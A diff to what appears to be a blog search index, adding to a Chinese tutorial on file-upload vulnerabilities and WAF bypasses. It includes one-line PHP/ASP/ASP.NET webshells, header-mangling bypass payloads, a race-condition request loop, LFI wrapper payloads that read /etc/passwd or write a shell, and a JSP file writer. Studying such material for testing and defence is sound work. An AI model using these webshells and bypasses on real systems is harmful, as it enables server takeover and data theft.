@@ -1275,6 +1275,12 @@
     <url>/2022/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。</span><br></pre></td></tr></table></figure>
 
+<p>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；<br>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；<br>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；<br>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</p>
+<p>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞 (Local File Include) 执行该文件。如将 bad.php 文件改名为 bad.doc 上传到服务器，再通过 PHP 的 include，include_once，require，require_once 等函数包含执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#x27;&#x27;]);?</span><br><span class="line">ASP: &lt;%eval request(&quot;&quot;)%</span><br><span class="line">ASP.NET &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;&quot;],&quot;unsafe&quot;);%</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="文件上传漏洞条件"><a href="#文件上传漏洞条件" class="headerlink" title="文件上传漏洞条件"></a>文件上传漏洞条件</h1><ul>
 <li>上传的文件能被Web服务器当做脚本来执行</li>
 <li>我们能够访问到上传文件的路径</li>
@@ -1303,6 +1309,7 @@
 <p>4.通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为asp/php/jsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改。</p>
 <h2 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>黑名单扩展名绕过</p>
 <p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：</p>
+<p>试一下能被解析的文件扩展名列表：如 <code>jsp—&gt;jspx—&gt;jspf</code>、<code>asp—&gt;asa—&gt;cer—&gt;aspx</code>、<code>php—&gt;php3—&gt;php4</code>、<code>exe—&gt;exee</code></p>
 <h3 id="（1）找黑名单扩展名的漏网之鱼"><a href="#（1）找黑名单扩展名的漏网之鱼" class="headerlink" title="（1）找黑名单扩展名的漏网之鱼"></a>（1）找黑名单扩展名的漏网之鱼</h3><ul>
 <li>比如 iis6.0 中的 asa 和 cer </li>
 </ul>
@@ -1335,7 +1342,8 @@
 <p>将一句话木马的文件名 backlion.php，改成 backlion.php.abc(奇怪的不被解析的后缀名都 行)。首先， 服务器验证文件扩展名的时候，验证的是.abc，只要该扩展名符合服务器端黑白名单觃则，即可上传。</p>
 <p>nginx 空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行。</p>
 <p>apache 的解析漏洞，上传如 a.php.rar a.php.gif 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的。</p>
-<h3 id="（2）-00和0x00截断。0x0a截断"><a href="#（2）-00和0x00截断。0x0a截断" class="headerlink" title="（2）%00和0x00截断。0x0a截断"></a><strong>（2）%00和0x00截断。</strong>0x0a截断</h3><p>通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg</p>
+<h3 id="（2）-00和0x00截断。0x0a截断"><a href="#（2）-00和0x00截断。0x0a截断" class="headerlink" title="（2）%00和0x00截断。0x0a截断"></a><strong>（2）%00和0x00截断。</strong>0x0a截断</h3><p>%00是chr(O)，它不是空格，是NULL，空字符。<br>当程序在输出含有chr(O)变量时，chr(O)后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。<br>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最后文件保存在本地时，%00会截断文件名，只保存%00之前的内容。<br>前提条件： PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态<br>绕过方法</p>
+<p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>
 <p>%00是被服务器解码为0x00发挥了截断作用</p>
 <p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p>
 <p>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</p>
@@ -1360,11 +1368,21 @@
 <p>通过Linux合成图片马,此时使用getimagesize()既可以获取图片信息，文件后缀php也能被解析为脚本文件，从而绕过getimagesize()的限制。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat image.jpg webshell.php &gt; image.php</span><br></pre></td></tr></table></figure>
 
-<h1 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h1><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含Webshell脚本，如果包含则删除文件。这里存在一个问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行文件上传和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
-<p>  利用：可以先上传一个webshell脚本10.php,10.php的内容是生成一个新的webshell脚本shell.php。10.php的代码如下</p>
+<h1 id="条件竞争攻击"><a href="#条件竞争攻击" class="headerlink" title="条件竞争攻击"></a>条件竞争攻击</h1><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含Webshell脚本，如果包含则删除文件。这里存在一个问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行文件上传和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
+<p>服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。</p>
+<p>  利用：</p>
+<p><strong>方法一</strong>：可以先上传一个webshell脚本10.php,10.php的内容是生成一个新的webshell脚本shell.php。10.php的代码如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">fputs(fopen(&#x27;../shell.php&#x27;,&#x27;w&#x27;),&#x27;一句话木马&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p> 当10.php上传成功后，客户端检查脚本文件后会自动生成shell.php。</p>
+<p><strong>方法二：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://119.23.73.3:5006/web2/uploads/b106f91010a3789acab1f27a00d67570052a7921/1.php&quot;</span>//网页链接</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> (requests.get(url).text)</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法三：</strong></p>
+<p>1、首先上传1.php文件，抓包，放到intruder模块中</p>
+<p>2、然后访问我们上传文件后的路径，抓包，也放到intruder模块中：</p>
+<p>3、设置这两个intruder的payloads，Payload type设置为Null payloads，然后设置访问次数（我这里设置的50000）：</p>
+<p>4、最后同时重放两个intruder模块，可以看到访问了50000次，最后只有4次成功了。其他的访问次数里，有小部分是状态码返回200但执行出错，大部分是返回404：</p>
 <h1 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h1><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的，但exif_imagetype函数快得多。PHP需要开启php_exif模块</p>
 <p><strong>绕过方法：</strong></p>
 <p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：</p>
@@ -1391,13 +1409,15 @@
 <h2 id="1-上传文件-WAF-检查的位置"><a href="#1-上传文件-WAF-检查的位置" class="headerlink" title="1.上传文件 WAF 检查的位置"></a>1.上传文件 WAF 检查的位置</h2><p>文件名：解析文件名，判断是否在黑名单内。文件内容：解析文件内容，判断是否为 webshell 文件目录权限 请求的 url Boundary 边界 MIME 文件类型 目前，市面上常见的是解析文件名，少数 WAF 是解析文件内容，比如长亭。</p>
 <h2 id="2-文件上传存在的上传特征"><a href="#2-文件上传存在的上传特征" class="headerlink" title="2.文件上传存在的上传特征"></a>2.文件上传存在的上传特征</h2><p>http 请求 Header 头部中的 Content-Type 存在以下特征：</p>
 <p>multipart/form-data:表示该请求是一个文件上传请求 存在 boundary 字符串:作用为分隔符，以区分 POST 数据 POST 的内容存在以下特征： Content-Disposition name filename POST 中的 boundary 的值就是 Content-Type 的值在最前面加了两个–，除了 最后 标识结束的 boundary 最后标识结束的 boundary 最后默认会多出两个–（测试时，最后一行的 boundary 删掉也能成功上传）。</p>
-<h2 id="3-绕过-WAF-文件上传的方法"><a href="#3-绕过-WAF-文件上传的方法" class="headerlink" title="3.绕过 WAF 文件上传的方法"></a>3.绕过 WAF 文件上传的方法</h2><h2 id="（1）填充垃圾数据绕过"><a href="#（1）填充垃圾数据绕过" class="headerlink" title="（1）填充垃圾数据绕过"></a>（1）填充垃圾数据绕过</h2><p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验；’ Content-Type 类型数据后添加垃圾数据：</p>
+<h2 id="3-绕过-WAF-文件上传的方法"><a href="#3-绕过-WAF-文件上传的方法" class="headerlink" title="3.绕过 WAF 文件上传的方法"></a>3.绕过 WAF 文件上传的方法</h2><h3 id="填充垃圾数据绕过"><a href="#填充垃圾数据绕过" class="headerlink" title="填充垃圾数据绕过"></a>填充垃圾数据绕过</h3><p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验；’ Content-Type 类型数据后添加垃圾数据：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">a=11111111111111111111111111111111111111111111111111111111</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;?php  ?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryYijPw9QB0WlswSL2</span><br><span class="line"></span><br><span class="line">a=111111111111111111111111111111111111111111111111111111111111111111111               </span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;bk.jpg&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
 
-<h2 id="（2）文件扩展名出回车绕过（只支持-php）"><a href="#（2）文件扩展名出回车绕过（只支持-php）" class="headerlink" title="（2）文件扩展名出回车绕过（只支持 php）"></a>（2）文件扩展名出回车绕过（只支持 php）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph</span><br><span class="line"></span><br><span class="line">p&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+<p>也可以在文件名中填充</p>
+<h3 id="畸形数据包绕过"><a href="#畸形数据包绕过" class="headerlink" title="畸形数据包绕过"></a>畸形数据包绕过</h3><p><strong>（1）文件扩展名出回车绕过（只支持 php）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph</span><br><span class="line"></span><br><span class="line">p&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
 
 <p>或者</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; file</span><br><span class="line"></span><br><span class="line">name=&quot;bk.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
@@ -1405,7 +1425,10 @@
 <p>又或者</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; fi</span><br><span class="line"></span><br><span class="line">lename=&quot;bk.php&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
 
-<h2 id="（3）重复数据-防匹配（参数多次）"><a href="#（3）重复数据-防匹配（参数多次）" class="headerlink" title="（3）重复数据-防匹配（参数多次）"></a>（3）重复数据-防匹配（参数多次）</h2><ul>
+
+
+<p><strong>（2）重复数据-防匹配（参数多次）</strong></p>
+<ul>
 <li>重复filename </li>
 </ul>
 <p>添加一个 finame 参数：</p>
@@ -1415,26 +1438,35 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;Content-Disposition: form-data; name=&quot;upload_file&quot;;x.php&quot;</span><br><span class="line">filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;filename=&quot;xx.jpg&quot;;...........filename=&quot;xx.php&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>●filename中配合其他参数</p>
-<p>配合Content-Disposition</p>
+<p>配合Content-Disposition  多次写</p>
 <p><img src="D:\github.io\source_posts\文件上传漏洞\upload.md" alt="img"></p>
 <p> 配合Content-Type</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="D:\github.io\source_posts\文件上传漏洞\watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA56qN5LiN6YCa55qE5Yez5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16" alt="img"></h2><h2 id="（4-修改-Content-Disposition-字段值的大小写绕过"><a href="#（4-修改-Content-Disposition-字段值的大小写绕过" class="headerlink" title="（4)修改 Content-Disposition 字段值的大小写绕过"></a>（4)修改 Content-Disposition 字段值的大小写绕过</h2><p>对这三个固定的字换:Content-Disposition,name,filename 比如 name 转换成 Name，Content-Disposition 转换成 content-disposition。 两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="D:\github.io\source_posts\文件上传漏洞\watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA56qN5LiN6YCa55qE5Yez5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16" alt="img"></h2><p><strong>（3)大小写绕过</strong></p>
+<p>对这三个固定的字换:Content-Disposition,name,filename 比如 name 转换成 Name，Content-Disposition 转换成 content-disposition。 两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
 <p>Content-Disposition: form-data; name=”upfile”; filename=”bk.php”</p>
 <p>改成</p>
 <p>Content-Disposition: form-data; nAme=”upfile”; filename=”bk.php”</p>
-<h2 id="（5）文件重命名绕过"><a href="#（5）文件重命名绕过" class="headerlink" title="（5）文件重命名绕过"></a>（5）文件重命名绕过</h2><p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name=”  file1”;</p>
+<p><strong>（4）文件重命名绕过</strong></p>
+<p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name=”  file1”;</p>
 <p>filename=”bk……………………………………………………………………………………………………..</p>
 <p>………………………………………………………………………………………………asp”大概几百个点。</p>
-<h2 id="（6）删除-Content-Disposition-值的-form-data-绕过"><a href="#（6）删除-Content-Disposition-值的-form-data-绕过" class="headerlink" title="（6）删除 Content-Disposition 值的 form-data 绕过"></a>（6）删除 Content-Disposition 值的 form-data 绕过</h2><p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<p>**（5）删除 **</p>
+<p><strong>Content-Disposition 值的 form-data 绕过</strong></p>
+<p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
 <p>Content-Disposition: form-data; name=”file1”; filename= “bk.php”</p>
 <p>改为：</p>
 <p>Content-Disposition: name=”file1”; filename= “bk.php”</p>
-<h2 id="7-符号变异"><a href="#7-符号变异" class="headerlink" title="(7)符号变异"></a>(7)符号变异</h2><p>符号变异就是猜测WAF检测的依据，例如filename=”a.php”</p>
+<p><strong>删除content-type</strong></p>
+<p><strong>(6)符号变异</strong></p>
+<p>符号变异就是猜测WAF检测的依据，例如filename=”a.php”</p>
 <p>网站安全狗WAF软件现在的机制就是匹配单/双引号里面的内容</p>
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;xx&#x27;.php</span><br><span class="line">&quot;xx;.php</span><br><span class="line">&#x27;xx;.php</span><br><span class="line">&quot;;xx.php</span><br><span class="line">&#x27;;xx.php</span><br><span class="line">&quot; xx.php</span><br><span class="line">&#x27; xx.php</span><br><span class="line">&quot;x x.php</span><br><span class="line">&#x27;x x.php</span><br></pre></td></tr></table></figure>
 
-<h2 id="8-数据截断-防匹配（-00-；-换行）"><a href="#8-数据截断-防匹配（-00-；-换行）" class="headerlink" title="(8)数据截断-防匹配（%00 ； 换行）"></a>(8)数据截断-防匹配（%00 ； 换行）</h2><p>通过用； 或者 %00 或者 换行 来截断文件名，使得WAF错误识别或不能识别文件类型从而达到绕过WAF</p>
+
+
+<p><strong>(7)数据截断-防匹配（%00 ； 换行）</strong></p>
+<p>通过用； 或者 %00 或者 换行 来截断文件名，使得WAF错误识别或不能识别文件类型从而达到绕过WAF</p>
 <ul>
 <li>文件名中加入图片后缀提前用分号截断(可行)</li>
 </ul>
@@ -1442,16 +1474,82 @@
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;ab.jpg;.php&quot;</span><br><span class="line"> </span><br><span class="line">&quot;abc.php%00.jpg&quot;                             #注意%00需要经过url编码</span><br><span class="line"> </span><br><span class="line">&quot;x.p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br><span class="line"> </span><br><span class="line">x.ph</span><br><span class="line">p</span><br><span class="line"> </span><br><span class="line">x.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p</span><br></pre></td></tr></table></figure>
 
-<p>（9）配合目录命名绕过</p>
+
+
+<p><strong>（8）配合目录命名绕过</strong></p>
 <p>“/“与”;”配合绕过</p>
 <p> <strong>payload:</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;/jpeg;x.php&quot;</span><br><span class="line">filename=&quot;/jpeg;/x.php&quot;</span><br></pre></td></tr></table></figure>
 
-<p>（10）配合FUZZ字典测试绕过</p>
+
+
+<p><strong>（9）filename 添加多个等号(不止2，3个)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename==&quot;2.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">-----------------------------127619278770</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>**（10)**<strong><strong>增删空格来进行绕过</strong></strong></p>
+<ul>
+<li>将 Content-Disposition: form-data 冒号后面增加或减少一个空格；</li>
+<li>将 form-data; name=“file”; 分号后面增加或减少一个空格；</li>
+<li>将 Content-Type: application/octet-stream 冒号后面增加一个空格</li>
+</ul>
+<p><strong>（11）</strong><strong><strong>利用文件包含</strong></strong></p>
+<p>利用php远程文件包含或者java反射调用外部jar等等操作。可是有时候连带有文件包含功能的函数也会被检测。。。</p>
+<p><strong>文件上传成功后利用</strong></p>
+<p>文件包含漏洞相关的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>结合协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">phar:// — PHP 归档</span><br></pre></td></tr></table></figure>
+
+<p>利用方式</p>
+<p><strong>php://</strong><br><strong>语法</strong>：php://filter/read=convert.base64-encode/resource=网页文件，可以用于读取网页源代码。</p>
+<p><strong>利用条件</strong>：开启allow_url_fopen<br>下面例子，可以读取到网站index.php的源码，并且返回的源码内容是经过base64编码的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用条件</strong>：开启allow_url_include=on<br><strong>php://input</strong>可以配合post发送数据，让网站执行post发送的数据。<br>下面例子中，将data中的PHP代码通过PHP伪协议将其作为file参数的值传递给服务端。当服务端对file参数执行include函数，即可让服务端执行用户输入的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/?file=php://input</span><br><span class="line">在data中输入：</span><br><span class="line">&lt;?php phpinfo()?&gt;   //显示PHPinfo信息，和结合其他函数，如system（&quot;命令&quot;）。</span><br><span class="line">或</span><br><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt;    //将一句话木马写入shell.php，并保存在服务器上。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>data://</strong><br>语法：data://text/plain;payload或base64,base64编码的payload，可以让服务端执行用户输入的代码。<br>利用条件：allow_url_fopen参数与allow_url_include都需开启。<br>下面例子中，让服务端执行了PHPinfo（）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>zip://</strong><br>语法：zip://[压缩文件路径]#[压缩文件内的子文件名]，绝对路径和相对路径即可，先将一句话木马文件压缩为zip，并上传至服务端，再利用zip://解压。<br>下面的例子中，将写入了一句话木马的shell.php文件，压缩为shell.zip，然后改为shell.jpg绕过图片上传限制。上传成功后，通过zip://让服务端解压并返回shell.php。<br>小细节：“#”需要手动写成“%23”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=zip://shell.jpg%23shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>file://</strong><br>语法：file://[文件的绝对路径和文件名]，可以读取服务端的文件内容。<br>下面例子中，查看了服务端的passwd文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>phar://</strong><br>语法：phar://[压缩文件路径]/[压缩文件内的子文件名]，绝对路径和相对路径即可，先将一句话木马文件压缩为zip，并上传至服务端，再利用phar://解压。<br>下面的例子中，将写入了一句话木马的shell.php文件，压缩为shell.zip，然后改为shell.jpg绕过图片上传限制。上传成功后，通过phar://让服务端解压并返回shell.php。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=phar://1.jpg/1.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充：file_get_contents(php://input)</strong></p>
+<p><strong>（12）</strong><strong><strong>替换被检测的内容</strong></strong></p>
+<p>比如java中Runtime.getRuntime().exec()经常被杀或者被拦截，这里可以通过调用ProcessBuilder类来实现相同的功能。<br>参考：<br><a href="https://www.cnblogs.com/sevck/p/7069251.html">https://www.cnblogs.com/sevck/p/7069251.html</a><br><a href="https://github.com/huyuanzhi2/fuck_waf_jspx">https://github.com/huyuanzhi2/fuck_waf_jspx</a><br>亲测可以绕过YxlinkWAF<br>又比如，fileOutputStream被拦截时：我可以用RandomAccessFile来替代：</p>
+<p><strong>（13）“曲线救国”</strong></p>
+<p>当我们没办法直接上传shell的时候，可以先上传一些小功能的脚本，比如写文件，cmdshell等等：<br>然后利用写文件或者cmdshell来写入shell，来达到我们的目的。<br>比如windows cmd下不换行输入来拆分eval：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;d:\xxx\dao.aspx set/p=^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;d:\xxx\dao.aspx set/p=^&lt;%ev</span><br><span class="line"></span><br><span class="line">&gt;&gt;d:\xxx\dao.aspx set/p=al(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[&quot;zz&quot;])))),&quot;unsafe&quot;);%^&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>上传的写文件函数</strong></p>
+<p>一个字节一个字节的将shell写进去</p>
+<p>先将我们的冰歇shell.jsp拆开：</p>
+<p>然后利用之前绕过waf上传的写文件脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">RandomAccessFile randomFile = new RandomAccessFile(application.getRealPath(&quot;/&quot;)+&quot;/&quot;+request.getParameter(&quot;f&quot;),&quot;rw&quot;);</span><br><span class="line">long fileLength = randomFile.length();</span><br><span class="line">randomFile.seek(fileLength);</span><br><span class="line">randomFile.write(request.getParameter(&quot;c&quot;).getBytes()); </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">参数 f=/shell.jsp&amp;c=</span><br></pre></td></tr></table></figure>
+
+<p>结合burp的intruder把冰歇马给写进去：</p>
+<p><strong>（14）配合FUZZ字典测试绕过</strong></p>
 <p>手工测试的话有点麻烦，可以借助写好的字典配合BP进行批量测试，先在本地测试，然后在真实环境进行测试，以防封IP。</p>
 <p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
 <p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
-<h1 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h1><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>漏洞原理</p>
+<h1 id="（字典）"><a href="#（字典）" class="headerlink" title="（字典）"></a>（字典）</h1><h1 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h1><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>漏洞原理</p>
 <p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
 <p>漏洞形式</p>
 <p><a href="http://www.xxxx.xxx.com/test.php.php123">http://www.xxxx.xxx.com/test.php.php123</a></p>
@@ -1512,9 +1610,13 @@
 <p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">(47条消息) 文件包含——原理及应用和防护（1）_Z_Grant的博客-CSDN博客_文件包含的作用</a></p>
 <p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">https://blog.csdn.net/Z_Grant/article/details/100606382</a></p>
 <p><a href="https://blog.csdn.net/aweiname2008/article/details/119522187">(47条消息) 从0到1 CTFer成功之路》任意文件读取漏洞—学习笔记_aweiname2008的博客-CSDN博客_任意文件读取漏洞</a></p>
-<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">(47条消息) Web安全-一句话木马_Tr0e-CSDN博客_一句话木马</a></p>
